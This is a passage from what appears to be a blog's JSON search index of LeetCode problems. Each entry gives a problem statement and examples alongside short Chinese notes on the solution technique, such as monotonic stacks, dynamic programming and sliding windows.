an n x n chessboard such that no two queens attack each other.Given an integer n, return the number of distinct solutions to the n-queens puzzle. Example 1:Input: n = 4Output: 2Explanation: There are two distinct solutions to the 4-queens puzzle as shown.Example 2:Input: n = 1Output: 1 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Backtracking"]},{"title":"leetcode-520 - Detect Capital","url":"/2021/08/leetcode-520/","content":"動機\n日常一水題\n\nProblem\nWe define the usage of capitals in a word to be right when one of the following cases holds:All letters in this word are capitals, like USA.All letters in this word are not capitals, like leetcode.Only the first letter in this word is capital, like Google.Given a string word, return true if the usage of capitals in it is right. Example 1:Input: word = USAOutput: trueExample 2:Input: word = FlaGOutput: false Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String"]},{"title":"leetcode-521 - Longest Uncommon Subsequence I","url":"/2021/08/leetcode-521/","content":"動機\n如果有機會面試，我就出這題\n\nProblem\nGiven two strings a and b, return the length of the longest uncommon subsequence between a and b. If the longest uncommon subsequence does not exist, return -1.An uncommon subsequence between two strings is a string that is a subsequence of one but not the other.A subsequence of a string s is a string that can be obtained after deleting any number of characters from s.For example, \"abc\" is a subsequence of \"aebdc\" because you can delete the underlined characters in \"aebdc\" to get \"abc\". Other subsequences of \"aebdc\" include \"aebdc\", \"aeb\", and \"\" (empty string). Example 1:Input: a = \"aba\", b = \"cdc\"Output: 3Explanation: One longest uncommon subsequence is \"aba\" because \"aba\" is a subsequence of \"aba\" but not \"cdc\".Note that \"cdc\" is also a longest uncommon subsequence.Example 2:Input: a = \"aaa\", b = \"bbb\"Output: 3Explanation: The longest uncommon subsequences are \"aaa\" and \"bbb\".Example 3:Input: a = \"aaa\", b = \"aaa\"Output: -1Explanation: Every subsequence of string a is also a subsequence of string b. Similarly, every subsequence of string b is also a subsequence of string a. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String"]},{"title":"leetcode-522 - Longest Uncommon Subsequence II","url":"/2021/08/leetcode-522/","content":"動機\n就是硬幹\n但isSubsequence很神，原來iterator可以這麼用\n\n用iterator比對時，沒比對到就會iterator往下，比對到就停\n\n\nProblem\nGiven an array of strings strs, return the length of the longest uncommon subsequence between them. If the longest uncommon subsequence does not exist, return -1.An uncommon subsequence between an array of strings is a string that is a subsequence of one string but not the others.A subsequence of a string s is a string that can be obtained after deleting any number of characters from s.For example, \"abc\" is a subsequence of \"aebdc\" because you can delete the underlined characters in \"aebdc\" to get \"abc\". Other subsequences of \"aebdc\" include \"aebdc\", \"aeb\", and \"\" (empty string). Example 1:Input: strs = [\"aba\",\"cdc\",\"eae\"]Output: 3Example 2:Input: strs = [\"aaa\",\"aaa\",\"aa\"]Output: -1 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Array","Two Pointers","Hash Table","Sorting"]},{"title":"leetcode-525 - Contiguous Array","url":"/2021/08/leetcode-525/","content":"動機\n用prefix sum紀錄偏移到哪邊了\n\nProblem\nGiven a binary array nums, return the maximum length of a contiguous subarray with an equal number of 0 and 1. Example 1:Input: nums = [0,1]Output: 2Explanation: [0, 1] is the longest contiguous subarray with an equal number of 0 and 1.Example 2:Input: nums = [0,1,0]Output: 2Explanation: [0, 1] (or [1, 0]) is a longest contiguous subarray with equal number of 0 and 1. Constraints:t1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Prefix Sum","Hash Table"]},{"title":"leetcode-529 - Minesweeper","url":"/2021/08/leetcode-529/","content":"動機\ndfs去點格子\n\nProblem\nLet's play the minesweeper game (Wikipedia, online game)!You are given an m x n char matrix board representing the game board where:t'M' represents an unrevealed mine,t'E' represents an unrevealed empty square,t'B' represents a revealed blank square that has no adjacent mines (i.e., above, below, left, right, and all 4 diagonals),tdigit ('1' to '8') represents how many mines are adjacent to this revealed square, andt'X' represents a revealed mine.You are also given an integer array click where click = [clickr, clickc] represents the next click position among all the unrevealed squares ('M' or 'E').Return the board after revealing this position according to the following rules:tIf a mine 'M' is revealed, then the game is over. You should change it to 'X'.tIf an empty square 'E' with no adjacent mines is revealed, then change it to a revealed blank 'B' and all of its adjacent unrevealed squares should be revealed recursively.tIf an empty square 'E' with at least one adjacent mine is revealed, then change it to a digit ('1' to '8') representing the number of adjacent mines.tReturn the board when no more squares will be revealed. Example 1:Input: board = [[\"E\",\"E\",\"E\",\"E\",\"E\"],[\"E\",\"E\",\"M\",\"E\",\"E\"],[\"E\",\"E\",\"E\",\"E\",\"E\"],[\"E\",\"E\",\"E\",\"E\",\"E\"]], click = [3,0]Output: [[\"B\",\"1\",\"E\",\"1\",\"B\"],[\"B\",\"1\",\"M\",\"1\",\"B\"],[\"B\",\"1\",\"1\",\"1\",\"B\"],[\"B\",\"B\",\"B\",\"B\",\"B\"]]Example 2:Input: board = [[\"B\",\"1\",\"E\",\"1\",\"B\"],[\"B\",\"1\",\"M\",\"1\",\"B\"],[\"B\",\"1\",\"1\",\"1\",\"B\"],[\"B\",\"B\",\"B\",\"B\",\"B\"]], click = [1,2]Output: [[\"B\",\"1\",\"E\",\"1\",\"B\"],[\"B\",\"1\",\"X\",\"1\",\"B\"],[\"B\",\"1\",\"1\",\"1\",\"B\"],[\"B\",\"B\",\"B\",\"B\",\"B\"]] Constraints:tm == board.lengthtn == board[i].lengtht1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Matrix","Breadth-First Search","Depth-First Search"]},{"title":"leetcode-546 - Remove Boxes","url":"/2021/08/leetcode-546/","content":"動機\n三維dp!?\n這真的能在45分做出來?\n\nProblem\nYou are given several boxes with different colors represented by different positive numbers.You may experience several rounds to remove boxes until there is no box left. Each time you can choose some continuous boxes with the same color (i.e., composed of k boxes, k >= 1), remove them and get k * k points.Return the maximum points you can get. Example 1:Input: boxes = [1,3,2,2,2,3,4,3,1]Output: 23Explanation:[1, 3, 2, 2, 2, 3, 4, 3, 1] ----> [1, 3, 3, 4, 3, 1] (3*3=9 points) ----> [1, 3, 3, 3, 1] (1*1=1 points) ----> [1, 1] (3*3=9 points) ----> [] (2*2=4 points)Example 2:Input: boxes = [1,1,1]Output: 9Example 3:Input: boxes = [1]Output: 1 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array","Memoization"]},{"title":"leetcode-575 - Distribute Candies","url":"/2021/08/leetcode-575/","content":"動機\n雞籠原理\n\nProblem\nAlice has n candies, where the ith candy is of type candyType[i]. Alice noticed that she started to gain weight, so she visited a doctor.The doctor advised Alice to only eat n / 2 of the candies she has (n is always even). Alice likes her candies very much, and she wants to eat the maximum number of different types of candies while still following the doctor's advice.Given the integer array candyType of length n, return the maximum number of different types of candies she can eat if she only eats n / 2 of them. Example 1:Input: candyType = [1,1,2,2,3,3]Output: 3Explanation: Alice can only eat 6 / 2 = 3 candies. Since there are only 3 types, she can eat one of each type.Example 2:Input: candyType = [1,1,2,3]Output: 2Explanation: Alice can only eat 4 / 2 = 2 candies. Whether she eats types [1,2], [1,3], or [2,3], she still can only eat 2 different types.Example 3:Input: candyType = [6,6,6,6]Output: 1Explanation: Alice can only eat 4 / 2 = 2 candies. Even though she can eat 2 candies, she only has 1 type. Constraints:tn == candyType.lengtht2 ","categories":["Algorithm","Leetcode"],"tags":["Array","Hash Table"]},{"title":"leetcode-587 - Erect the Fence","url":"/2021/08/leetcode-587/","content":"動機\n人生第一次凸包\n\nProblem\nYou are given an array trees where trees[i] = [xi, yi] represents the location of a tree in the garden.You are asked to fence the entire garden using the minimum length of rope as it is expensive. The garden is well fenced only if all the trees are enclosed.Return the coordinates of trees that are exactly located on the fence perimeter. Example 1:Input: points = [[1,1],[2,2],[2,0],[2,4],[3,3],[4,2]]Output: [[1,1],[2,0],[3,3],[2,4],[4,2]]Example 2:Input: points = [[1,2],[2,2],[4,2]]Output: [[4,2],[2,2],[1,2]] Constraints:t1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Math","Geometry"]},{"title":"leetcode-605 - Can Place Flowers","url":"/2021/08/leetcode-605/","content":"動機\n比起對起點做特別處理，全部列出來再把不合法的濾掉會比較簡單\n\nProblem\nYou have a long flowerbed in which some of the plots are planted, and some are not. However, flowers cannot be planted in adjacent plots.Given an integer array flowerbed containing 0's and 1's, where 0 means empty and 1 means not empty, and an integer n, return if n new flowers can be planted in the flowerbed without violating the no-adjacent-flowers rule. Example 1:Input: flowerbed = [1,0,0,0,1], n = 1Output: trueExample 2:Input: flowerbed = [1,0,0,0,1], n = 2Output: false Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Greedy"]},{"title":"leetcode-61 - Rotate List","url":"/2021/08/leetcode-61/","content":"動機\n比array好多了\n\nProblem\nGiven the head of a linked list, rotate the list to the right by k places. Example 1:Input: head = [1,2,3,4,5], k = 2Output: [4,5,1,2,3]Example 2:Input: head = [0,1,2], k = 4Output: [2,0,1] Constraints:The number of nodes in the list is in the range [0, 500].-100 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Two Pointers","Linked List"]},{"title":"leetcode-630 - Course Schedule III","url":"/2021/08/leetcode-630/","content":"動機\n巧妙地讓heap描述當前總和的組成\n\nProblem\nThere are n different online courses numbered from 1 to n. You are given an array courses where courses[i] = [durationi, lastDayi] indicate that the ith course should be taken continuously for durationi days and must be finished before or on lastDayi.You will start on the 1st day and you cannot take two or more courses simultaneously.Return the maximum number of courses that you can take. Example 1:Input: courses = [[100,200],[200,1300],[1000,1250],[2000,3200]]Output: 3Explanation: There are totally 4 courses, but you can take 3 courses at most:First, take the 1st course, it costs 100 days so you will finish it on the 100th day, and ready to take the next course on the 101st day.Second, take the 3rd course, it costs 1000 days so you will finish it on the 1100th day, and ready to take the next course on the 1101st day. Third, take the 2nd course, it costs 200 days so you will finish it on the 1300th day. The 4th course cannot be taken now, since you will finish it on the 3300th day, which exceeds the closed date.Example 2:Input: courses = [[1,2]]Output: 1Example 3:Input: courses = [[3,2],[4,3]]Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Heap (Priority Queue)","Greedy"]},{"title":"leetcode-632 - Smallest Range Covering Elements from K Lists","url":"/2021/08/leetcode-632/","content":"動機\n就heap\n\nProblem\nYou have k lists of sorted integers in non-decreasing order. Find the smallest range that includes at least one number from each of the k lists.We define the range [a, b] is smaller than range [c, d] if b - a < d - c or a < c if b - a == d - c. Example 1:Input: nums = [[4,10,15,24,26],[0,9,12,20],[5,18,22,30]]Output: [20,24]Explanation: List 1: [4, 10, 15, 24,26], 24 is in range [20,24].List 2: [0, 9, 12, 20], 20 is in range [20,24].List 3: [5, 18, 22, 30], 22 is in range [20,24].Example 2:Input: nums = [[1,2,3],[1,2,3],[1,2,3]]Output: [1,1]Example 3:Input: nums = [[10,10],[11,11]]Output: [10,11]Example 4:Input: nums = [[10],[11]]Output: [10,11]Example 5:Input: nums = [[1],[2],[3],[4],[5],[6],[7]]Output: [1,7] Constraints:nums.length == k1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Heap (Priority Queue)","Greedy","Hash Table","Sorting","Sliding Window"]},{"title":"leetcode-658 - Find K Closest Elements","url":"/2021/08/leetcode-658/","content":"動機\n\nbisect的index要處理好\n就算是greedy，也要讓程式判斷再去長\n你的sliding window不是我的sliding windows\n\n\nProblem\nGiven a sorted integer array arr, two integers k and x, return the k closest integers to x in the array. The result should also be sorted in ascending order.An integer a is closer to x than an integer b if:|a - x| < |b - x|, or|a - x| == |b - x| and a < b Example 1:Input: arr = [1,2,3,4,5], k = 4, x = 3Output: [1,2,3,4]Example 2:Input: arr = [1,2,3,4,5], k = 4, x = -1Output: [1,2,3,4] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Two Pointers","Binary Search","Heap (Priority Queue)","Sorting"]},{"title":"leetcode-665 - Non-decreasing Array","url":"/2021/08/leetcode-665/","content":"動機\n我覺得我自己寫的很難懂，所以來看別人的\n\nProblem\nGiven an array nums with n integers, your task is to check if it could become non-decreasing by modifying at most one element.We define an array is non-decreasing if nums[i] ","categories":["Algorithm","Leetcode"],"tags":["Array"]},{"title":"leetcode-705 - Design HashSet","url":"/2021/08/leetcode-705/","content":"動機\n我就懶\n\nProblem\nDesign a HashSet without using any built-in hash table libraries.Implement MyHashSet class:void add(key) Inserts the value key into the HashSet.bool contains(key) Returns whether the value key exists in the HashSet or not.void remove(key) Removes the value key in the HashSet. If key does not exist in the HashSet, do nothing. Example 1:Input[MyHashSet, add, add, contains, contains, add, contains, remove, contains][[], [1], [2], [1], [3], [2], [2], [2], [2]]Output[null, null, null, true, false, null, true, null, false]ExplanationMyHashSet myHashSet = new MyHashSet();myHashSet.add(1);      // set = [1]myHashSet.add(2);      // set = [1, 2]myHashSet.contains(1); // return TruemyHashSet.contains(3); // return False, (not found)myHashSet.add(2);      // set = [1, 2]myHashSet.contains(2); // return TruemyHashSet.remove(2);   // set = [1]myHashSet.contains(2); // return False, (already removed) Constraints:0 ","categories":["Algorithm","Leetcode"],"tags":["Array","Design","Linked List","Hash Table","Hash Function"]},{"title":"leetcode-713 - Subarray Product Less Than K","url":"/2021/08/leetcode-713/","content":"動機\nright-left + 1等於以right為最後一個的array到left之間的所有array的組合數\n這題要知道這個魔法才能做\n\nProblem\nGiven an array of integers nums and an integer k, return the number of contiguous subarrays where the product of all the elements in the subarray is strictly less than k. Example 1:Input: nums = [10,5,2,6], k = 100Output: 8Explanation: The 8 subarrays that have product less than 100 are:[10], [5], [2], [6], [10, 5], [5, 2], [2, 6], [5, 2, 6]Note that [10, 5, 2] is not included as the product of 100 is not strictly less than k.Example 2:Input: nums = [1,2,3], k = 0Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Sliding Window"]},{"title":"leetcode-718 - Maximum Length of Repeated Subarray","url":"/2021/08/leetcode-718/","content":"動機\n超有意思的題目，只能用bottomup dp的題目!!\n下次不能說topdown與bottomup的dp可以互換了\n\ntopdown dp與bottomup dp差在一個在前半段處理，另一個在後半段\n\n因為上面的特質導致這題只能用bottomup\n\nProblem\nGiven two integer arrays nums1 and nums2, return the maximum length of a subarray that appears in both arrays. Example 1:Input: nums1 = [1,2,3,2,1], nums2 = [3,2,1,4,7]Output: 3Explanation: The repeated subarray with maximum length is [3,2,1].Example 2:Input: nums1 = [0,0,0,0,0], nums2 = [0,0,0,0,0]Output: 5 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array","Binary Search","Sliding Window","Hash Function","Rolling Hash"]},{"title":"leetcode-720 - Longest Word in Dictionary","url":"/2021/08/leetcode-720/","content":"動機\n類似word break去硬幹\n\nProblem\nGiven an array of strings words representing an English Dictionary, return the longest word in words that can be built one character at a time by other words in words.If there is more than one possible answer, return the longest word with the smallest lexicographical order. If there is no answer, return the empty string. Example 1:Input: words = [w,wo,wor,worl,world]Output: worldExplanation: The word world can be built one character at a time by w, wo, wor, and worl.Example 2:Input: words = [a,banana,app,appl,ap,apply,apple]Output: appleExplanation: Both apply and apple can be built from other words in the dictionary. However, apple is lexicographically smaller than apply. Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["String","Array","Hash Table","Sorting","Trie"]},{"title":"leetcode-745 - Prefix and Suffix Search","url":"/2021/08/leetcode-745/","content":"動機\nHard題都是來看創意的\n\n用pair讓兩個dfs整合在一起\n把prefix與suffix encode成一個字串\n\n\nProblem\nDesign a special dictionary with some words that searchs the words in it by a prefix and a suffix.Implement the WordFilter class:WordFilter(string[] words) Initializes the object with the words in the dictionary.f(string prefix, string suffix) Returns the index of the word in the dictionary, which has the prefix prefix and the suffix suffix. If there is more than one valid index, return the largest of them. If there is no such word in the dictionary, return -1. Example 1:Input[WordFilter, f][[[apple]], [a, e]]Output[null, 0]ExplanationWordFilter wordFilter = new WordFilter([apple]);wordFilter.f(a, e); // return 0, because the word at index 0 has prefix = a and suffix = 'e. Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["String","Design","Trie"]},{"title":"leetcode-767 - Reorganize String","url":"/2021/08/leetcode-767/","content":"動機\n先看621\n\nProblem\nGiven a string s, rearrange the characters of s so that any two adjacent characters are not the same.Return any possible rearrangement of s or return  if not possible. Example 1:Input: s = aabOutput: abaExample 2:Input: s = aaabOutput:  Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["String","Heap (Priority Queue)","Greedy","Hash Table","Sorting","Counting"]},{"title":"leetcode-768 - Max Chunks To Make Sorted II","url":"/2021/08/leetcode-768/","content":"動機\n基本上看到seg與要順序都可以猜用Monotonic Stack\n這裡可以直接抄768用\n\nProblem\nYou are given an integer array arr.We split arr into some number of chunks (i.e., partitions), and individually sort each chunk. After concatenating them, the result should equal the sorted array.Return the largest number of chunks we can make to sort the array. Example 1:Input: arr = [5,4,3,2,1]Output: 1Explanation:Splitting into two or more chunks will not return the required result.For example, splitting into [5, 4], [3, 2, 1] will result in [4, 5, 1, 2, 3], which isn't sorted.Example 2:Input: arr = [2,1,3,4,4]Output: 4Explanation:We can split into two chunks, such as [2, 1], [3, 4, 4].However, splitting into [2, 1], [3], [4], [4] is the highest number of chunks possible. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Stack","Greedy","Sorting","Monotonic Stack"]},{"title":"leetcode-769 - Max Chunks To Make Sorted","url":"/2021/08/leetcode-769/","content":"動機\n這裡的Monotonic Stack不同於84的用法\nstack放的是sort好的區塊，放上最大值(或是區塊的最後一個)\n或是利用只有0~n-1的特性\n\nProblem\nYou are given an integer array arr of length n that represents a permutation of the integers in the range [0, n - 1].We split arr into some number of chunks (i.e., partitions), and individually sort each chunk. After concatenating them, the result should equal the sorted array.Return the largest number of chunks we can make to sort the array. Example 1:Input: arr = [4,3,2,1,0]Output: 1Explanation:Splitting into two or more chunks will not return the required result.For example, splitting into [4, 3], [2, 1, 0] will result in [3, 4, 0, 1, 2], which isn't sorted.Example 2:Input: arr = [1,0,2,3,4]Output: 4Explanation:We can split into two chunks, such as [1, 0], [2, 3, 4].However, splitting into [1, 0], [2], [3], [4] is the highest number of chunks possible. Constraints:n == arr.length1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Stack","Greedy","Sorting","Monotonic Stack"]},{"title":"leetcode-77 - Combinations","url":"/2021/08/leetcode-77/","content":"動機\n用for去merge list比用sum([...],[])快，但好多行\n\nProblem\nGiven two integers n and k, return all possible combinations of k numbers out of the range [1, n].You may return the answer in any order. Example 1:Input: n = 4, k = 2Output:[  [2,4],  [3,4],  [2,3],  [1,2],  [1,3],  [1,4],]Example 2:Input: n = 1, k = 1Output: [[1]] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Backtracking"]},{"title":"leetcode-827 - Making A Large Island","url":"/2021/08/leetcode-827/","content":"動機\npython的主場來啦\n\nProblem\nYou are given an n x n binary matrix grid. You are allowed to change at most one 0 to be 1.Return the size of the largest island in grid after applying this operation.An island is a 4-directionally connected group of 1s. Example 1:Input: grid = [[1,0],[0,1]]Output: 3Explanation: Change one 0 to 1 and connect two 1s, then we get an island with area = 3.Example 2:Input: grid = [[1,1],[1,0]]Output: 4Explanation: Change the 0 to 1 and make the island bigger, only one island with area = 4.Example 3:Input: grid = [[1,1],[1,1]]Output: 4Explanation: Can't change any 0 to 1, only one island with area = 4. Constraints:n == grid.lengthn == grid[i].length1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Matrix","Union Find","Breadth-First Search","Depth-First Search"]},{"title":"leetcode-828 - Count Unique Characters of All Substrings of a Given String","url":"/2021/08/leetcode-828/","content":"動機\n看解答時是跪著的，能理解為什麼有人看到解答就想打錢過去了\n\nProblem\nLet's define a function countUniqueChars(s) that returns the number of unique characters on s.For example if s = LEETCODE then L, T, C, O, D are the unique characters since they appear only once in s, therefore countUniqueChars(s) = 5.Given a string s, return the sum of countUniqueChars(t) where t is a substring of s.Notice that some substrings can be repeated so in this case you have to count the repeated ones too. Example 1:Input: s = ABCOutput: 10Explanation: All possible substrings are: A,B,C,AB,BC and ABC.Evey substring is composed with only unique letters.Sum of lengths of all substring is 1 + 1 + 1 + 2 + 2 + 3 = 10Example 2:Input: s = ABAOutput: 8Explanation: The same as example 1, except countUniqueChars(ABA) = 1.Example 3:Input: s = LEETCODEOutput: 92 Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Dynamic Programming","String"]},{"title":"leetcode-852 - Peak Index in a Mountain Array","url":"/2021/08/leetcode-852/","content":"動機\n用bsearch去猜數字\n\nProblem\nLet's call an array arr a mountain if the following properties hold:arr.length >= 3There exists some i with 0 < i < arr.length - 1 such that:arr[0] < arr[1] < ... arr[i-1] < arr[i] arr[i] > arr[i+1] > ... > arr[arr.length - 1]Given an integer array arr that is guaranteed to be a mountain, return any i such that arr[0] < arr[1] < ... arr[i - 1] < arr[i] > arr[i + 1] > ... > arr[arr.length - 1]. Example 1:Input: arr = [0,1,0]Output: 1Example 2:Input: arr = [0,2,1,0]Output: 1Example 3:Input: arr = [0,10,5,2]Output: 1Example 4:Input: arr = [3,4,5,1]Output: 2Example 5:Input: arr = [24,69,100,99,79,78,67,36,26,19]Output: 2 Constraints:3 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Binary Search"]},{"title":"leetcode-856 - Score of Parentheses","url":"/2021/08/leetcode-856/","content":"動機\n用stack去計分數，另外solution的解法很神\n\nProblem\nGiven a balanced parentheses string s, return the score of the string.The score of a balanced parentheses string is based on the following rule:\"()\" has score 1.AB has score A + B, where A and B are balanced parentheses strings.(A) has score 2 * A, where A is a balanced parentheses string. Example 1:Input: s = \"()\"Output: 1Example 2:Input: s = \"(())\"Output: 2Example 3:Input: s = \"()()\"Output: 2Example 4:Input: s = \"(()(()))\"Output: 6 Constraints:2 ","categories":["Algorithm","Leetcode"],"tags":["String","Stack"]},{"title":"leetcode-862 - Shortest Subarray with Sum at Least K","url":"/2021/08/leetcode-862/","content":"動機\n\nWhat makes this problem hard is that we have negative values.\n\n\nsliding window + monotone stack = monotone queue\nprefix sum in fly + hash\n\n\nProblem\nGiven an integer array nums and an integer k, return the length of the shortest non-empty subarray of nums with a sum of at least k. If there is no such subarray, return -1.A subarray is a contiguous part of an array. Example 1:Input: nums = [1], k = 1Output: 1Example 2:Input: nums = [1,2], k = 4Output: -1Example 3:Input: nums = [2,-1,2], k = 3Output: 3 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Prefix Sum","Binary Search","Heap (Priority Queue)","Sliding Window","Monotonic Queue","Queue"]},{"title":"leetcode-89 - Gray Code","url":"/2021/08/leetcode-89/","content":"動機\n一個是直接幹，一個是mirror\n\nProblem\nAn n-bit gray code sequence is a sequence of 2n integers where:tEvery integer is in the inclusive range [0, 2n - 1],tThe first integer is 0,tAn integer appears no more than once in the sequence,tThe binary representation of every pair of adjacent integers differs by exactly one bit, andtThe binary representation of the first and last integers differs by exactly one bit.Given an integer n, return any valid n-bit gray code sequence. Example 1:Input: n = 2Output: [0,1,3,2]Explanation:The binary representation of [0,1,3,2] is [00,01,11,10].- 00 and 01 differ by one bit- 01 and 11 differ by one bit- 11 and 10 differ by one bit- 10 and 00 differ by one bit[0,2,3,1] is also a valid gray code sequence, whose binary representation is [00,10,11,01].- 00 and 10 differ by one bit- 10 and 11 differ by one bit- 11 and 01 differ by one bit- 01 and 00 differ by one bitExample 2:Input: n = 1Output: [0,1] Constraints:t1 ","categories":["Algorithm","Leetcode"],"tags":["Math","Bit Manipulation","Backtracking"]},{"title":"leetcode-891 - Sum of Subsequence Widths","url":"/2021/08/leetcode-891/","content":"動機\n每個數字都會分別在每個是最大最小的seg中擔任最大最小\n所以只要把組合數算出來就好\n在你以為要列舉時，直接算組合數\n\nProblem\nThe width of a sequence is the difference between the maximum and minimum elements in the sequence.Given an array of integers nums, return the sum of the widths of all the non-empty subsequences of nums. Since the answer may be very large, return it modulo 109 + 7.A subsequence is a sequence that can be derived from an array by deleting some or no elements without changing the order of the remaining elements. For example, [3,6,2,7] is a subsequence of the array [0,3,1,6,2,2,7]. Example 1:Input: nums = [2,1,3]Output: 6Explanation: The subsequences are [1], [2], [3], [2,1], [2,3], [1,3], [2,1,3].The corresponding widths are 0, 0, 0, 1, 1, 2, 2.The sum of these widths is 6.Example 2:Input: nums = [2]Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Math","Sorting"]},{"title":"leetcode-895 - Maximum Frequency Stack","url":"/2021/08/leetcode-895/","content":"動機\n有趣的一題\n\nProblem\nDesign a stack-like data structure to push elements to the stack and pop the most frequent element from the stack.Implement the FreqStack class:FreqStack() constructs an empty frequency stack.void push(int val) pushes an integer val onto the top of the stack.int pop() removes and returns the most frequent element in the stack.If there is a tie for the most frequent element, the element closest to the stack's top is removed and returned. Example 1:Input[FreqStack, push, push, push, push, push, push, pop, pop, pop, pop][[], [5], [7], [5], [7], [4], [5], [], [], [], []]Output[null, null, null, null, null, null, null, 5, 7, 5, 4]ExplanationFreqStack freqStack = new FreqStack();freqStack.push(5); // The stack is [5]freqStack.push(7); // The stack is [5,7]freqStack.push(5); // The stack is [5,7,5]freqStack.push(7); // The stack is [5,7,5,7]freqStack.push(4); // The stack is [5,7,5,7,4]freqStack.push(5); // The stack is [5,7,5,7,4,5]freqStack.pop();   // return 5, as 5 is the most frequent. The stack becomes [5,7,5,7,4].freqStack.pop();   // return 7, as 5 and 7 is the most frequent, but 7 is closest to the top. The stack becomes [5,7,5,4].freqStack.pop();   // return 5, as 5 is the most frequent. The stack becomes [5,7,4].freqStack.pop();   // return 4, as 4, 5 and 7 is the most frequent, but 4 is closest to the top. The stack becomes [5,7]. Constraints:0 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Stack","Design","Hash Table","Ordered Set"]},{"title":"leetcode-901 - Online Stock Span","url":"/2021/08/leetcode-901/","content":"動機\n連續、小於等於最後一個值\n就是用Monotonic Stack\n\nProblem\nDesign an algorithm that collects daily price quotes for some stock and returns the span of that stock's price for the current day.The span of the stock's price today is defined as the maximum number of consecutive days (starting from today and going backward) for which the stock price was less than or equal to today's price.For example, if the price of a stock over the next 7 days were [100,80,60,70,60,75,85], then the stock spans would be [1,1,1,2,1,4,6].Implement the StockSpanner class:StockSpanner() Initializes the object of the class.int next(int price) Returns the span of the stock's price given that today's price is price. Example 1:Input[\"StockSpanner\", \"next\", \"next\", \"next\", \"next\", \"next\", \"next\", \"next\"][[], [100], [80], [60], [70], [60], [75], [85]]Output[Algorithm, Leetcode, 1, 1, 1, 2, 1, 4, 6]ExplanationStockSpanner stockSpanner = new StockSpanner();stockSpanner.next(100); // return 1stockSpanner.next(80);  // return 1stockSpanner.next(60);  // return 1stockSpanner.next(70);  // return 2stockSpanner.next(60);  // return 1stockSpanner.next(75);  // return 4, because the last 4 prices (including today's price of 75) were less than or equal to today's price.stockSpanner.next(85);  // return 6 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Stack","Design","Monotonic Stack","Data Stream"]},{"title":"leetcode-904 - Fruit Into Baskets","url":"/2021/08/leetcode-904/","content":"動機\nsliding window的重點是怎麼重用其中一邊的點\n\nProblem\nYou are visiting a farm that has a single row of fruit trees arranged from left to right. The trees are represented by an integer array fruits where fruits[i] is the type of fruit the ith tree produces.You want to collect as much fruit as possible. However, the owner has some strict rules that you must follow:You only have two baskets, and each basket can only hold a single type of fruit. There is no limit on the amount of fruit each basket can hold.Starting from any tree of your choice, you must pick exactly one fruit from every tree (including the start tree) while moving to the right. The picked fruits must fit in one of your baskets.Once you reach a tree with fruit that cannot fit in your baskets, you must stop.Given the integer array fruits, return the maximum number of fruits you can pick. Example 1:Input: fruits = [1,2,1]Output: 3Explanation: We can pick from all 3 trees.Example 2:Input: fruits = [0,1,2,2]Output: 3Explanation: We can pick from trees [1,2,2].If we had started at the first tree, we would only pick from trees [0,1].Example 3:Input: fruits = [1,2,3,2,2]Output: 4Explanation: We can pick from trees [2,3,2,2].If we had started at the first tree, we would only pick from trees [1,2].Example 4:Input: fruits = [3,3,3,1,2,1,1,2,3,3,4]Output: 5Explanation: We can pick from trees [1,2,1,1,2]. Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Hash Table","Sliding Window"]},{"title":"leetcode-905 - Sort Array By Parity","url":"/2021/08/leetcode-905/","content":"動機\n用pointer去塞\n\nProblem\nGiven an integer array nums, move all the even integers at the beginning of the array followed by all the odd integers.Return any array that satisfies this condition. Example 1:Input: nums = [3,1,2,4]Output: [2,4,3,1]Explanation: The outputs [4,2,3,1], [2,4,1,3], and [4,2,1,3] would also be accepted.Example 2:Input: nums = [0]Output: [0] Constraints:t1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Two Pointers","Sorting"]},{"title":"leetcode-907 - Sum of Subarray Minimums","url":"/2021/08/leetcode-907/","content":"動機\n之前有一題就是用左右兩邊的長度相乘算組合數，不過這題還要快速求出左右兩邊，所以就用了monotone stack\nmonotone stack有兩個用途\n\nprevious less element\nnext less element\n\n詳細看這篇\n\nProblem\nGiven an array of integers arr, find the sum of min(b), where b ranges over every (contiguous) subarray of arr. Since the answer may be large, return the answer modulo 109 + 7. Example 1:Input: arr = [3,1,2,4]Output: 17Explanation: Subarrays are [3], [1], [2], [4], [3,1], [1,2], [2,4], [3,1,2], [1,2,4], [3,1,2,4]. Minimums are 3, 1, 2, 4, 1, 1, 2, 1, 1, 1.Sum is 17.Example 2:Input: arr = [11,81,94,43,3]Output: 444 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array","Stack","Monotonic Stack"]},{"title":"leetcode-926 - Flip String to Monotone Increasing","url":"/2021/08/leetcode-926/","content":"動機\n做完有種我不會dp的感覺\n\nProblem\nA binary string is monotone increasing if it consists of some number of 0's (possibly none), followed by some number 